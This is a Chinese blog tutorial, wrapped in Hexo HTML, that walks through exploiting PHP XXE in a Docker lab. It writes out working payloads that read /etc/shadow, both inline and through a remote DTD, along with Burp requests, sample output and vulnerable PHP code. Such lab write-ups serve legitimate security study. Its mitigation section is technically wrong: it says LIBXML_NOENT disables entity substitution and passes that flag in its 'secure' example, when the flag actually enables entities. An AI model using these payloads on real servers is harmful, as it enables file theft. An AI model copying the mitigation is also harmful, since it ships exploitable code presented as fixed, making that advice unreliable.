@@ -1,0 +1,1036 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="bae">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="PHP XXE 漏洞利用与原理引言XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP XXE 漏洞利用与原理">
+<meta property="og:url" content="https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:site_name" content="bae的博客">
+<meta property="og:description" content="PHP XXE 漏洞利用与原理引言XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bae-ace.github.io/img/php_xxe.jpg">
+<meta property="article:published_time" content="2025-07-29T06:39:23.000Z">
+<meta property="article:modified_time" content="2025-08-01T09:53:53.084Z">
+<meta property="article:author" content="bae">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="XXE">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://bae-ace.github.io/img/php_xxe.jpg">
+  
+  
+  
+  <title>PHP XXE 漏洞利用与原理 - bae的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"bae-ace.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":60,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"CHbSLmwKFof8sHkOvlnoDfza-MdYXbMMI","app_key":"lVqIfnWUAiZZLIag2RoSpxoo","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-07-19T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>bae&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-books"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-book"></i>
+                <span>文档</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/" target="_self">
+                    
+                    <span>主题博客</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/docs/guide/" target="_self">
+                    
+                    <span>配置指南</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hexo.fluid-dev.com/docs/icon/" target="_self">
+                    
+                    <span>图标用法</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/AI%E9%A3%8E%E6%99%AF.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PHP XXE 漏洞利用与原理"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        bae
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-29 14:39" pubdate>
+           2025 年 07 月 29 日 , 下午 02:39 , 星期二
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span>次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PHP XXE 漏洞利用与原理</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="PHP-XXE-漏洞利用与原理"><a href="#PHP-XXE-漏洞利用与原理" class="headerlink" title="PHP XXE 漏洞利用与原理"></a>PHP XXE 漏洞利用与原理</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场环境搭建，以及防护建议，旨在帮助读者深入理解并有效应对此类漏洞。</p>
+<hr>
+<h2 id="一、XXE-漏洞简介"><a href="#一、XXE-漏洞简介" class="headerlink" title="一、XXE 漏洞简介"></a>一、XXE 漏洞简介</h2><p>XXE（XML External Entity Injection）漏洞发生在 XML 解析器处理外部实体时，若未正确配置，允许攻击者通过恶意 XML 输入加载外部实体，从而执行文件读取、SSRF 或其他攻击。PHP 环境中，常见于使用 <code>libxml2</code> 库（如 <code>SimpleXMLElement</code> 或 <code>DOMDocument</code>）解析 XML 时，未禁用外部实体解析。</p>
+<p><strong>危害</strong>：</p>
+<ul>
+<li>读取服务器本地文件（如 <code>/etc/passwd</code>、<code>/etc/shadow</code>）。</li>
+<li>发起 SSRF，访问内网资源。</li>
+<li>在特定条件下，可能导致拒绝服务（DoS）或远程代码执行（RCE）。</li>
+</ul>
+<hr>
+<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p>XXE 漏洞的核心在于 XML 解析器对外部实体（External Entities）的处理。XML 支持通过 <code>&lt;!ENTITY&gt;</code> 定义实体，实体可以引用本地文件或远程资源。如果解析器未限制外部实体加载，攻击者可通过以下方式触发漏洞：</p>
+<ol>
+<li><p><strong>构造恶意 XML 载荷</strong>：</p>
+<ul>
+<li><p>使用 <code>&lt;!DOCTYPE&gt;</code> 和 <code>&lt;!ENTITY&gt;</code> 定义外部实体，指向本地文件（如 <code>file:///etc/shadow</code>）或远程资源。</p>
+</li>
+<li><p>示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;aaa;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>服务器解析 XML</strong>：</p>
+<ul>
+<li>服务器使用不安全的 XML 解析器（如 PHP 的 <code>DOMDocument</code>）处理输入。</li>
+<li>解析器加载外部实体，将文件内容替换到实体引用（如 <code>&amp;aaa;</code>）。</li>
+</ul>
+</li>
+<li><p><strong>信息泄露或进一步攻击</strong>：</p>
+<ul>
+<li>解析器回显实体内容（如 <code>/etc/shadow</code>），导致敏感信息泄露。</li>
+<li>若支持远程实体，可加载攻击者控制的 DTD 文件，触发 SSRF 或更复杂攻击。</li>
+</ul>
+</li>
+</ol>
+<p><strong>关键条件</strong>：</p>
+<ul>
+<li>服务器允许外部实体解析（PHP 默认未禁用 <code>libxml2</code> 的外部实体）。</li>
+<li>应用直接处理用户提交的 XML 输入。</li>
+<li>解析结果可能被回显或以某种方式暴露。</li>
+</ul>
+<hr>
+<h2 id="三、靶场环境准备"><a href="#三、靶场环境准备" class="headerlink" title="三、靶场环境准备"></a>三、靶场环境准备</h2><p>以下是复现 PHP XXE 漏洞的环境搭建步骤，基于提供的靶场要求：</p>
+<h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ul>
+<li><strong>操作系统</strong>：Kali Linux（IP：192.168.56.102，仅主机网卡）</li>
+<li><strong>靶场地址</strong>：<code>http://192.168.56.102:8080/</code></li>
+<li><strong>工具</strong>：<ul>
+<li>Burp Suite：抓包与修改 HTTP 请求</li>
+<li>Firefox 浏览器：设置代理到 Burp Suite（127.0.0.1:8080）</li>
+<li>Python HTTP 服务（可选）：托管远程 DTD 文件</li>
+</ul>
+</li>
+<li><strong>前提</strong>：已完成《php xxe漏洞靶场搭建.docx》中的搭建步骤，靶场运行正常。</li>
+</ul>
+<h3 id="快速验证靶场"><a href="#快速验证靶场" class="headerlink" title="快速验证靶场"></a>快速验证靶场</h3><ol>
+<li><p>启动靶场：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>确认靶场可访问：</p>
+<ul>
+<li>在 Firefox 浏览器中访问 <code>http://192.168.56.102:8080/dom.php</code>。</li>
+<li>若页面正常加载，靶场搭建成功。</li>
+</ul>
+</li>
+<li><p>配置 Burp Suite 和 Firefox：</p>
+<ul>
+<li>启动 Burp Suite，启用 Proxy 模块，默认监听 <code>127.0.0.1:8080</code>。</li>
+<li>在 Firefox 中设置手动代理，指向 <code>127.0.0.1:8080</code>。</li>
+</ul>
+</li>
+<li><p>（可选）准备远程 DTD 服务：</p>
+<ul>
+<li><p>在 Kali 上启动 Python HTTP 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>将 <code>test.dtd</code> 放入 HTTP 服务根目录，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="四、漏洞利用步骤"><a href="#四、漏洞利用步骤" class="headerlink" title="四、漏洞利用步骤"></a>四、漏洞利用步骤</h2><h3 id="1-启动-Burp-Suite-并抓包"><a href="#1-启动-Burp-Suite-并抓包" class="headerlink" title="1. 启动 Burp Suite 并抓包"></a>1. 启动 Burp Suite 并抓包</h3><ul>
+<li><p>打开 Burp Suite，确认 Proxy 模块监听 <code>127.0.0.1:8080</code>。</p>
+</li>
+<li><p>在 Firefox 中访问靶场漏洞页面：<code>http://192.168.56.102:8080/dom.php</code>。</p>
+</li>
+<li><p>Burp Suite 拦截到以下 GET 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/dom.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.56.102:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>右键点击请求，选择 “Send to Repeater” 以便后续修改。</p>
+</li>
+</ul>
+<h3 id="2-构造-XXE-Payload"><a href="#2-构造-XXE-Payload" class="headerlink" title="2. 构造 XXE Payload"></a>2. 构造 XXE Payload</h3><p>以下是两种常见的 XXE 攻击载荷：</p>
+<h4 id="Payload-1：读取本地文件（如-etc-shadow）"><a href="#Payload-1：读取本地文件（如-etc-shadow）" class="headerlink" title="Payload 1：读取本地文件（如 /etc/shadow）"></a>Payload 1：读取本地文件（如 <code>/etc/shadow</code>）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;aaa;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：</p>
+<ul>
+<li><code>&lt;!ENTITY aaa SYSTEM &quot;file:///etc/shadow&quot;&gt;</code> 定义了一个外部实体，指向服务器本地文件 <code>/etc/shadow</code>。</li>
+<li><code>&lt;a&gt;&amp;aaa;&lt;/a&gt;</code> 引用实体，解析时会将文件内容替换到 <code>&amp;aaa;</code>。</li>
+</ul>
+<h4 id="Payload-2：远程加载-DTD"><a href="#Payload-2：远程加载-DTD" class="headerlink" title="Payload 2：远程加载 DTD"></a>Payload 2：远程加载 DTD</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY % y <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.56.102/test.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  %y;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;aaa;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>远程</strong> <code>test.dtd</code> <strong>内容</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：</p>
+<ul>
+<li><code>&lt;!ENTITY % y SYSTEM &quot;http://192.168.56.102/test.dtd&quot;&gt;</code> 加载远程 DTD 文件。</li>
+<li><code>%y;</code> 执行 DTD 中的定义，间接加载 <code>/etc/shadow</code>。</li>
+<li>适用于绕过本地实体限制或实现更复杂的攻击。</li>
+</ul>
+<h3 id="3-发送攻击请求"><a href="#3-发送攻击请求" class="headerlink" title="3. 发送攻击请求"></a>3. 发送攻击请求</h3><p>在 Burp Suite 的 Repeater 模块中，构造以下 POST 请求（以 Payload 1 为例）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/dom.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.56.102:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>132<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE a [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/shadow&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;aaa;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>关键点</strong>：</p>
+<ul>
+<li>设置 <code>Content-Type: application/xml</code> 以确保服务器按 XML 解析。</li>
+<li>调整 <code>Content-Length</code> 为实际载荷长度。</li>
+<li>点击 “Send”，发送请求。</li>
+</ul>
+<h3 id="4-验证攻击结果"><a href="#4-验证攻击结果" class="headerlink" title="4. 验证攻击结果"></a>4. 验证攻击结果</h3><ul>
+<li><p>若靶场未正确过滤外部实体，响应中会回显 <code>/etc/shadow</code> 文件内容，形如：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">root:$<span class="hljs-number">6</span>$...[hash]...:<span class="hljs-number">18356:0</span>:<span class="hljs-number">99999:7</span>:::<br>daemon:*:<span class="hljs-number">18356:0</span>:<span class="hljs-number">99999:7</span>:::<br>...<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>若使用 Payload 2，确认 Python HTTP 服务日志中有 <code>test.dtd</code> 的请求记录，且响应仍包含 <code>/etc/shadow</code> 内容。</p>
+</li>
+</ul>
+<p><strong>验证成功标志</strong>：</p>
+<ul>
+<li>响应中包含敏感文件内容。</li>
+<li>无回显（盲 XXE）情况下，可通过外部 DTD 请求或错误信息推断漏洞存在。</li>
+</ul>
+<hr>
+<h2 id="五、XXE-漏洞深入分析"><a href="#五、XXE-漏洞深入分析" class="headerlink" title="五、XXE 漏洞深入分析"></a>五、XXE 漏洞深入分析</h2><h3 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h3><ol>
+<li><strong>不安全的 XML 解析</strong>：<ul>
+<li>PHP 应用使用 <code>DOMDocument</code> 或 <code>SimpleXMLElement</code> 处理 XML 输入。</li>
+<li>默认配置未禁用外部实体（<code>libxml_disable_entity_loader(false)</code>）。</li>
+</ul>
+</li>
+<li><strong>恶意实体注入</strong>：<ul>
+<li>攻击者提交包含 <code>&lt;!ENTITY&gt;</code> 的 XML 载荷。</li>
+<li>实体引用本地文件、远程 URL 或参数实体。</li>
+</ul>
+</li>
+<li><strong>信息泄露或攻击</strong>：<ul>
+<li>解析器加载实体内容，可能导致：<ul>
+<li>本地文件内容泄露。</li>
+<li>SSRF（访问内网资源，如 <code>http://localhost:8080</code>）。</li>
+<li>DoS（如加载 <code>/dev/random</code> 或构造 Billion Laughs 攻击）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="PHP-环境中的常见问题"><a href="#PHP-环境中的常见问题" class="headerlink" title="PHP 环境中的常见问题"></a>PHP 环境中的常见问题</h3><ul>
+<li><p><strong>默认配置</strong>：PHP 的 <code>libxml2</code> 默认允许外部实体加载。</p>
+</li>
+<li><p><strong>代码示例</strong>（易受攻击的 PHP 代码）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dom</span>-&gt;textContent;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>上述代码直接解析用户输入的 XML，未禁用外部实体，易受 XXE 攻击。</p>
+</li>
+</ul>
+<hr>
+<h2 id="六、防护建议"><a href="#六、防护建议" class="headerlink" title="六、防护建议"></a>六、防护建议</h2><ol>
+<li><p><strong>禁用外部实体解析</strong>：</p>
+<ul>
+<li><p>在 PHP 中使用 <code>libxml_disable_entity_loader(true)</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>或设置 <code>LIBXML_NOENT</code> 标志禁用实体替换。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>使用安全的解析方式</strong>：</p>
+<ul>
+<li>避免直接解析用户提交的 XML。</li>
+<li>使用 JSON 或其他格式替代 XML。</li>
+</ul>
+</li>
+<li><p><strong>白名单验证输入</strong>：</p>
+<ul>
+<li>验证 XML 结构，仅允许预期的标签和属性。</li>
+<li>使用 XML Schema 或 DTD 限制输入。</li>
+</ul>
+</li>
+<li><p><strong>网络隔离</strong>：</p>
+<ul>
+<li>限制服务器出站连接，防止 SSRF 访问内网资源。</li>
+<li>使用防火墙阻止非必要外部请求。</li>
+</ul>
+</li>
+<li><p><strong>升级依赖</strong>：</p>
+<ul>
+<li>确保 PHP 和 <code>libxml2</code> 库为最新版本，修复已知漏洞。</li>
+</ul>
+</li>
+<li><p><strong>错误信息屏蔽</strong>：</p>
+<ul>
+<li>禁用详细错误回显，避免泄露文件路径或系统信息。</li>
+</ul>
+</li>
+</ol>
